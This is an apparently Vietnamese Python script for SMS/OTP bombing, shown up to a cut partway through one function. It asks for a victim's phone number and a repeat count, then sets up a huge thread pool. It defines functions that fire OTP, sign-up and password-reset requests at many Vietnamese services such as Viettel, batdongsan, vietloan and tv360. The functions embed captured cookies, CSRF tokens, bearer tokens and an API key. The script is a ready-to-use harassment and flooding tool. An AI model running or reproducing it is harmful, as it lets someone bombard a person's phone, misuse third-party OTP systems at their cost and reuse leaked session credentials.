import requests,sys,time,json,os
from concurrent.futures import ThreadPoolExecutor
# cau hinh lay tt
threading = ThreadPoolExecutor(max_workers=int(100000))
tgian = 2
phone = input("Nhập số điện thoại: ")
amount = int(input("Nhập số lần spam: "))
# tạo hàm
def medigoapp(phone):
  headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en,zh-CN;q=0.9,zh;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://www.medigoapp.com',
    'priority': 'u=1, i',
    'referer': 'https://www.medigoapp.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
  json_data = {
    'phone': '+84'+ phone[1:],
}
  response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)


def ecogreen(phone):
  headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en,zh-CN;q=0.9,zh;q=0.8',
    'content-type': 'application/json;charset=UTF-8',
    # 'cookie': 'auth.strategy=local; _gcl_gs=2.1.k1$i1723793684; _gcl_au=1.1.2076860473.1723793685; _gid=GA1.3.551658966.1723793685; _fbp=fb.2.1723793685176.332591177147545404; _ga_G9P9P58D5Y=GS1.1.1723793685.1.0.1723793685.60.0.0; _gat_UA-89533981-1=1; _ga=GA1.3.667798213.1723793685; _dc_gtm_UA-91935928-1=1; __uidac=0166bf011692ac5b6c038f93423a2aa3; __iid=; __iid=; __su=0; __su=0; dtdz=36095d2a-0225-5932-b990-4f48cf688109; __adm_upl=eyJ0aW1lIjoxNzIzNzkzNjkxLCJfdXBsIjpudWxsfQ==; _gat_UA-91935928-1=1; _gcl_aw=GCL.1723793704.CjwKCAjw8fu1BhBsEiwAwDrsjGG9hf3DQ9dRSzGBzk0L8aHncre0fEwDhL6fQGjZnTPNA8JIj4s3IRoC8p8QAvD_BwE; _gac_UA-91935928-1=1.1723793705.CjwKCAjw8fu1BhBsEiwAwDrsjGG9hf3DQ9dRSzGBzk0L8aHncre0fEwDhL6fQGjZnTPNA8JIj4s3IRoC8p8QAvD_BwE; _ga_GEFZP21KYF=GS1.3.1723793685.1.1.1723793704.41.0.0; __RC=194; __R=0; __uif=__uid%3A2837936862898947904%7C__ui%3A-1%7C__create%3A1723793686; _gac_UA-89533981-1=1.1723793715.CjwKCAjw8fu1BhBsEiwAwDrsjGG9hf3DQ9dRSzGBzk0L8aHncre0fEwDhL6fQGjZnTPNA8JIj4s3IRoC8p8QAvD_BwE; _gac_UA-89533981-2=1.1723793715.CjwKCAjw8fu1BhBsEiwAwDrsjGG9hf3DQ9dRSzGBzk0L8aHncre0fEwDhL6fQGjZnTPNA8JIj4s3IRoC8p8QAvD_BwE; _gat_UA-89533981-2=1; _ga_F8EJ8FPVHZ=GS1.1.1723793685.1.1.1723793719.0.0.0',
    'csrf-secret': 'W-doJ8jxqPJHe5aGubXFKLkE',
    'csrf-token': 'FrMY9m5N-Ye-tV4NNfU6liI6T1mQLyDotYXXGTfkdkwSrNdlA8_g',
    'origin': 'https://ecogreen.com.vn',
    'priority': 'u=1, i',
    'referer': 'https://ecogreen.com.vn/Jex_mmh30k/?gad_source=1&gclid=CjwKCAjw8fu1BhBsEiwAwDrsjGG9hf3DQ9dRSzGBzk0L8aHncre0fEwDhL6fQGjZnTPNA8JIj4s3IRoC8p8QAvD_BwE',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
  json_data = {
    'phone': phone,
}
  response = requests.post('https://ecogreen.com.vn/api/auth/register/send-otp', headers=headers, json=json_data)

def beecow(phone):
  headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en,zh-CN;q=0.9,zh;q=0.8',
    'authorization': 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJndWVzdF9ldmdjZjJxcyIsImF1dGgiOiJST0xFX0dVRVNUIiwiZGlzcGxheU5hbWUiOiJndWVzdF9ldmdjZjJxcyIsInVzZXJJZCI6Mjg0NzM4NzkzLCJsb2NhdGlvbkNvZGUiOiJWTi1TRyIsImV4cCI6MTc1NTMyMjgzM30.e0K201Y-lGeS41KpBE4mjQNiftCSWTpKW7s_yBlDVJbaDqA05qPOM4Hs6JM6V5EkY4iNa_Rj3SXAplQlyIzx0w',
    'content-type': 'application/json',
    'origin': 'https://www.gomua.vn',
    'platform': 'WEB',
    'priority': 'u=1, i',
    'referer': 'https://www.gomua.vn/',
    'salechannel': 'GOMUA',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
  json_data = {
    'password': '1234gt]mah',
    'mobile': {
        'countryCode': '+84',
        'phoneNumber': phone,
    },
    'displayName': 'que huong',
    'locationCode': 'VN',
    'langKey': 'vi',
    'imageBase64': '',
    'captchaResponse': '',
}
  response = requests.post('https://api.beecow.com/api/register2/mobile/phone', headers=headers, json=json_data)

def tv360(phone):
    a = requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":phone[0:11]})).text

def phuclong(phone):
  a = requests.post("https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd",headers={
    "Host": "api-crownx.winmart.vn",
    "sec-ch-ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    "accept": "application/json",
    "content-type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "authorization": "Bearer undefined",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "origin": "https://order.phuclong.com.vn",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dessec-fetch-dest": "empty",
    "referer": "https://order.phuclong.com.vn/",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
  },data='{"userName":"' + phone + '"}')

def fm(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://fm.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fm.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
    'x-emp': '',
    'x-fromweb': 'true',
    'x-requestid': '9a563626-1886-40ce-a5b2-99971fd53161',
}

    json_data = {
    'Phone': phone,
    'LatOfMap': '106',
    'LongOfMap': '108',
    'Browser': '',
}

    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)

def robot(phone):
    cookies = {
    '_fbp': 'fb.1.1720102725444.358598086701375218',
    '_gcl_au': '1.1.619229570.1720102726',
    'mousestats_vi': 'acaa606972ae539932c0',
    '_tt_enable_cookie': '1',
    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
    '_ym_uid': '1720102728534641572',
    '_ym_d': '1720102728',
    '_gid': 'GA1.2.557208002.1720622172',
    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
    '_ym_isad': '2',
    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.1882430469.1720102726',
    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_png_client': 'false',
    'ec_png_client_utm': 'null',
    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'false',
    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_etag_client_utm': 'null',
    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'client': 'false',
    'client_utm': 'null',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
    'origin': 'https://vietloan.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vietloan.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
}

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)

def batdongsan(phone):
    cookies = {
    'con.unl.lat': '1720112400',
    'con.unl.sc': '1',
    '_gid': 'GA1.3.2048602791.1720189695',
    '_tt_enable_cookie': '1',
    '_ttp': 'loSwVu_AC7yj50Md2HhAQPUajHo',
    '_clck': 'k364l7%7C2%7Cfn7%7C0%7C1647',
    '_fbp': 'fb.2.1720189698853.917828572155116943',
    '_hjSessionUser_1708983': 'eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
    '__zi': '3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1',
    '_gcl_au': '1.1.888803755.1720189704',
    'con.ses.id': '684bd57c-05df-40e6-8f09-cb91b12b83ee',
    '_cfuvid': '7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000',
    '_gat_UA-3729099-1': '1',
    '_hjSession_1708983': 'eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
    '_hjHasCachedUserAttributes': 'true',
    '__gads': 'ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg',
    '__gpi': 'UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ',
    '__eoi': 'ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu',
    'cf_clearance': 'CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A',
    'ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D',
    'ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D',
    '_ga': 'GA1.3.697835917.1720189695',
    '_clsk': 'lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect',
    'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D',
    'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D',
    '_ga_HTS298453C': 'GS1.1.1720194528.2.1.1720194561.27.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    # 'cookie': 'con.unl.lat=1720112400; con.unl.sc=1; _gid=GA1.3.2048602791.1720189695; _tt_enable_cookie=1; _ttp=loSwVu_AC7yj50Md2HhAQPUajHo; _clck=k364l7%7C2%7Cfn7%7C0%7C1647; _fbp=fb.2.1720189698853.917828572155116943; _hjSessionUser_1708983=eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==; __zi=3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1; _gcl_au=1.1.888803755.1720189704; con.ses.id=684bd57c-05df-40e6-8f09-cb91b12b83ee; _cfuvid=7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000; _gat_UA-3729099-1=1; _hjSession_1708983=eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _hjHasCachedUserAttributes=true; __gads=ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg; __gpi=UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ; __eoi=ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu; cf_clearance=CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A; ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D; ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D; _ga=GA1.3.697835917.1720189695; _clsk=lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D; _ga_HTS298453C=GS1.1.1720194528.2.1.1720194561.27.0.0',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    params = {
    'phoneNumber': phone,
}

    response = requests.get(
    'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
    params=params,
    cookies=cookies,
    headers=headers,
)

def dvcd(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)

def myvt(phone):
    cookies = {
        'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
        '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
        'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
         'Cookie': 'laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
